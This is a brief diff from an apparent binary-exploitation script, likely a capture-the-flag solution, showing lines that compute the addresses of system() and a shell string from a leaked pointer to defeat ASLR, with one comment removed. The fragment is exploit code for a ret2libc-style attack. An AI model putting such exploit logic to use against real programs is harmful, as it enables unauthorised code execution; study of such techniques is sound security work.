@@ -98,7 +98,6 @@ def exploit(r):
     new = int(new,0)
     #caculuate the system address in order to bypass ASLR
     system = new - 0x37f7e8
-    #Calculuate the bash address in order to bypass ASLR 
     bash = new - 0x237e21
     #info 
     log.info("[+] leak : " + hex(new))
